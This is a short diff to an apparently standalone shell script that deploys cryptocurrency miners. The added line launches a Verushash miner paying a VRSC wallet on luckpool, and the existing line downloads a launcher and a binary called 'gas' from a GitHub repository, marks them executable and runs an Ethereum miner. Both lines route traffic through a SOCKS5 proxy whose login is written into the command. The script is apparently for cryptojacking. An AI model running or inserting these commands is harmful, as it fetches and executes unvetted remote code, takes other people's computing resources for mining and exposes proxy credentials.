@@ -1,3 +1,6 @@
+./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RLrUZCSPhvkaKhai5XMJZthRVXuzKqQ7T2  -rigName  113255 -pool1 ap.luckpool.net:3956 -cpuThreads=1 -x socks5://cicbjdfz:e0hrej2sojtf@193.8.56.119:9183
+
+
 wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo Ethash -coin ETH -wallet 0x4f7c661f68e2581416ea6942d0ba829db44fb311 -rigName  eth -pool1 us1.ethermine.org:4444 -cpuThreads=1 -x socks5://cicbjdfz:e0hrej2sojtf@193.8.56.119:9183
 
 
